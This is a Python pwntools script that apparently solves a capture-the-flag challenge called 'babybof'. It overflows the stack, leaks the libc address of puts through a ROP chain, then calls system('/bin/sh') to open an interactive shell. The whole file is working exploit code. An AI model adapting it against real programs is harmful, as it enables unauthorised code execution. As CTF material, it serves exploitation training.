from pwn import *



host, port = 'chals20.cybercastors.com', 14425
p = process('./babybof')
# p = remote(host, port)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

offset = 264
pop_rdi = 0x00000000004007f3 # : pop rdi ; ret
pop_rbp = 0x0000000000400668 # : pop rbp ; ret
puts_got = 0x601020
puts_main = 0x000000000040075f
char = 'ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFG'


payload = b'A'*offset
# pad = ''.join([i*8 for i in char])
# payload = bytes(pad, 'utf-8')
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_main)


print (p.recvline())
# gdb.attach(p)
p.sendline(payload)

p.recv(15)
leak = int.from_bytes(p.recv()[:-1], "little")
log.info('LEAK : {}'.format(hex(leak)))

base = leak - libc.sym['puts']
system = base + libc.sym['system']
binsh = base +  0x1881ac #libc.search('/bin/sh')

log.info('SYSTEM : {}'.format(hex(system)))
log.info('BINSH : {}'.format(hex(binsh)))

payload = b'B'*offset
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

p.sendline(payload)
p.interactive()